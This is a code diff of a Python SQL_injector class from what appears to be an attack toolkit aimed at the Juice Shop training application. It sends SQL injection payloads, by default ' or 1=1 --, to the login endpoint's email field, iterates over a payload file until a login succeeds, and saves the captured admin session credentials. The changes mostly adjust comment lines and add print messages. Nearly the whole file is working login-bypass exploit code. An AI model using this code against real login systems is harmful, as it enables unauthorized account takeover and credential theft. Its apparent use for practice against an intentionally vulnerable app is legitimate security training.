@@ -17,20 +17,20 @@ from . import attack as a
 #---------------------------------------------------------------------------------------
 #Class: SQL_injector
 #Inherit: Attack
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
 class SQL_injector(a.attack_inter):
     
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION: __init__ 
 #ARGUMENTS: N/A
 #RETURNS: void
 #Description: Initial class variables(REST session; URL).
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def __init__(self):
         self.juice_session = a.requests.session()
         self.url = a.URL + '/rest/user/login'
     
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION generator
 #ARGUMENTS: myScript --> the SQL_injection payload. 
 #RETURNS: json_data  --> will be embedded into POST request json field. 
@@ -38,7 +38,7 @@ class SQL_injector(a.attack_inter):
 #             Payload will is injected in user email field.
 #NOTES:
 # ALL REST requests needed data like json_data, header, and cookie must generated through this function
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def generator(self, myScript):
         #cookies = COOKIE
         json_data = {
@@ -47,7 +47,7 @@ class SQL_injector(a.attack_inter):
         }
         return json_data
 
-#-----------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION run
 #ARGUMENTS: userInput(optional) --> SQL injection payload/dictionary 
 #           username(optional)  --> target Username
@@ -55,8 +55,9 @@ class SQL_injector(a.attack_inter):
 #Description: This is the main function for plugin to send REST requests.
 #             
 #NOTES: None
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def run(self, userInput = '\' or 1=1 --', username = 'admin'):
+        print("================Start SQL injection==============")
         a.logging.basicConfig(filename='./test_logging_info.log', level=a.logging.INFO, format='%(asctime)s %(message)s')
         logger = a.logging.getLogger("SQL_injection")
         a.logging.Formatter.converter = time.gmtime
@@ -69,20 +70,23 @@ class SQL_injector(a.attack_inter):
                 line = line.rstrip()
                 json_data = self.generator(line)
                 response = self.juice_session.post(self.url, json=json_data, verify=False)
-                print(response.status_code)
                 if response.status_code == 200:
+                    print("Successfully login through SQL injection.")
                     print("Valid script: ", json_data['email'])
+                    print(username, "'s credential is already added into user.json.")
                     a.set_auth(username,response)
                     break
+            print("================SQL injection finished==============")
             a.logging.info('Finished')
         else:
             json_data = self.generator(userInput)
             response = self.juice_session.post(self.url, json=json_data)
-            print(response.status_code)
             if response.status_code == 200:
-                print(response.text)
-                print("Valid script: ", json_data['email'])
                 a.set_auth(username,response)
-
+                print("Successfully login through SQL injection.")
+                print(username, "'s credential is already added into user.json.")
+            else:
+                print("SQL injection Failed, please try other payloads")
             a.logging.info('Finished')
+            print("================SQL injection finished==============")
             return response.status_code
